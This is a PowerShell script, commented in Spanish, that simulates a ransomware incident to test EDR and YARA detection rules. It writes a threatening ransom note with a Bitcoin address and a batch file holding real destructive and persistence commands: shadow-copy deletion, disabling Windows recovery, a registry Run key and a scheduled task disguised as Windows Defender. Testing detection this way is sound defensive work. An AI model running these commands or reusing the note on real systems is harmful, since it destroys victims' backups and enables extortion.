# ESCENARIO 1: Simulación de Ransomware
# Este script simula el comportamiento de ransomware SIN hacer daño real

Write-Host "`n🦠 SIMULACIÓN DE RANSOMWARE - MODO SEGURO`n" -ForegroundColor Red

$testFolder = "$env:USERPROFILE\Desktop\RANSOMWARE_TEST"
New-Item -Path $testFolder -ItemType Directory -Force | Out-Null

Write-Host "[FASE 1] Creando nota de rescate..." -ForegroundColor Yellow

# Nota de ransomware (debería activar regla YARA: Ransomware_Note)
$ransomNote = @"
╔══════════════════════════════════════════╗
║   🔒 YOUR FILES HAVE BEEN ENCRYPTED 🔒   ║
╚══════════════════════════════════════════╝

All your important files (documents, photos, databases) 
have been encrypted with military-grade encryption.

💰 PAYMENT REQUIRED:
   Send 0.5 Bitcoin to: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2

🌐 INSTRUCTIONS:
   1. Download TOR Browser
   2. Visit: http://decrypt4you.onion
   3. Enter your ID: VICTIM-2025-12345

⏰ TIME REMAINING: 72 hours
   After this time, your decryption key will be destroyed forever.

⚠️ WARNING:
   - Do NOT try to decrypt files yourself
   - Do NOT contact authorities
   - Do NOT restart your computer

For questions, email: decrypt@protonmail.com
"@

$ransomNote | Out-File "$testFolder\!!!READ_ME_TO_DECRYPT!!!.txt"

Write-Host "[FASE 2] Simulando archivos 'encriptados'..." -ForegroundColor Yellow

# Crear archivos falsos con extensiones de ransomware
@("documento_importante", "foto_familiar", "base_datos") | ForEach-Object {
    "ENCRYPTED_DATA_DO_NOT_DELETE" | Out-File "$testFolder\$_.locked"
}

Write-Host "[FASE 3] Creando script de persistencia..." -ForegroundColor Yellow

# Script batch sospechoso (debería activar: Suspicious_Batch_Commands)
$maliciousBatch = @"
@echo off
:: Eliminar copias de seguridad (Shadow Copies)
vssadmin delete shadows /all /quiet

:: Deshabilitar recuperación de Windows
bcdedit /set {default} recoveryenabled no

:: Agregar persistencia en el registro
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SystemUpdate" /t REG_SZ /d "%temp%\malware.exe" /f

:: Programar tarea
schtasks /create /tn "WindowsDefender" /tr "cmd.exe /c start http://malware.com" /sc onlogon

echo Encryption complete!
"@

$maliciousBatch | Out-File "$testFolder\encrypt_system.bat"

Write-Host "`n✅ Simulación creada en: $testFolder" -ForegroundColor Green
Write-Host "`n🎯 TU EDR DEBERÍA DETECTAR:" -ForegroundColor Cyan
Write-Host "   • Nota de ransomware (YARA: Ransomware_Note)" -ForegroundColor White
Write-Host "   • Script batch malicioso (YARA: Suspicious_Batch_Commands)" -ForegroundColor White
Write-Host "   • Archivos .locked (extensión sospechosa si la agregas a config.json)`n" -ForegroundColor White

Start-Process explorer.exe $testFolder
